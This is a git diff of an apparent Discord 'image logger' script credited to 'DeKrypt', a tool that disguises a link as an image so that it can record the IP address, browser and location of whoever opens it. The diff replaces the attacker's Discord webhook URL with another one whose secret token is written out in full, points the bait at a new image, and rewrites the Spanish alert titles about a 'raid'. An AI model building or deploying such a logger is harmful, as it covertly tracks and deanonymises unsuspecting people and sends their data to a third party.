@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1340910948231151666/-FEC8VLZ8WwDF7V3wwhS19uqtEiXo4YK_UnFrVzpFLCi6vJmnaFPXrt693tAB-S8MuYD",
-    "image": "https://memes-pied.vercel.app/api/Ip.py", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1334994830517993552/MpqAcsKa13aPyH74rT6Ttfpj4TBFAeKoC0NVWI4AF24TmPOmZK-A6HTaJTbb8JwA-vqm",
+    "image": "https://i.ibb.co/5gCCSnHR/image.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -80,7 +80,7 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Raid si/no? - Error",
+            "title": "Image Logger - Error",
             "color": config["color"],
             "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
         }
@@ -99,9 +99,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Quieren Raid - Link Sent",
+            "title": "LES HABLA EL GRAN CID🥵",
             "color": config["color"],
-            "description": f"**CID LES DICE** QUIEREN RAID 🥰🥰🥰.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"**QUIEREN UN RAID 🥳**.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
